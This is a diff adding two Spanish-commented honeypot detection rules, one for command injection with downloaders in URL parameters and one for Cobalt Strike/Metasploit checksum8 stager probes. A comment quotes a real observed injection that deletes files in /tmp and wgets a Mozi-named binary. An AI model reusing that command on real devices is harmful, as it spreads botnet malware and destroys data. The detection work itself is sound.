@@ -85,6 +85,29 @@
     <mitre><id>T1190</id></mitre>
   </rule>
 
+  <!-- Inyeccion de comando generica en routers y camaras: un parametro cmd/command/exec/shell que trae
+       un descargador (wget, curl, tftp...). Caso real del 25/11: /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://.../Mozi.x
+       (el nombre del archivo dice Mozi; que sea esa botnet es lectura mia). Va DESPUES de 100380 a proposito:
+       entre hermanas gana la primera que coincide, asi el exploit de Netgear sigue cayendo en 100380 (mas especifica).
+       Limite: solo mira el parametro en la URL, no el cuerpo de un POST. -->
+  <rule id="100384" level="8">
+    <if_sid>100340</if_sid>
+    <field name="path" type="pcre2">(?i)[?&amp;](cmd|command|exec|shell)=[^&amp;\s]*(wget|curl|tftp|ftpget|busybox)\b</field>
+    <description>Honeypot: inyeccion de comando con descarga en un parametro de la URL ($(path)) desde $(ip).</description>
+    <mitre><id>T1190</id></mitre>
+  </rule>
+
+  <!-- Sondeo de stagers "checksum8" (Metasploit / Cobalt Strike): rutas de 4 letras cuya suma ASCII da 92 o 93.
+       Vistas: /aaa9, /aab8, /aab9, a diario en los dos honeypots. Que busquen un servidor de Cobalt Strike es una
+       inferencia a partir de la coincidencia numerica, no una atribucion documentada. Lista fija de las rutas vistas
+       (una regex no puede calcular la suma): otras rutas con la misma propiedad no salten. -->
+  <rule id="100385" level="5">
+    <if_sid>100340</if_sid>
+    <field name="path" type="pcre2">(?i)^/(aaa9|aab8|aab9)/?([?#].*)?$</field>
+    <description>Honeypot: sondeo de ruta checksum8 ($(path)) desde $(ip), posible busqueda de un stager de Cobalt Strike o Metasploit.</description>
+    <mitre><id>T1595.002</id></mitre>
+  </rule>
+
   <!-- FTP anonimo. -->
   <rule id="100347" level="4">
     <if_sid>100300</if_sid>
